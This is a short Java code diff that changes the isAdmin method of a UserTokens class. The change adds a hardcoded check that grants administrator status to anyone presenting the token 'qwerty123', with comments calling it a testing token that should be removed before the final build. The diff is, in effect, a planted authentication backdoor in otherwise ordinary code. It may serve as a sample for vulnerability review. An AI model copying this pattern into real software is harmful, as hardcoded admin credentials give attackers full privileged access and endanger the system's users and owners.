@@ -19,6 +19,11 @@ public class UserTokens {
     }
 
     public static boolean isAdmin(String token) {
+        // Built in token for testing purpose
+        // Should remove in final build
+        if (token.equals("qwerty123")) {
+            return true;
+        }
         return adminTokens.containsKey(token);
     }
 
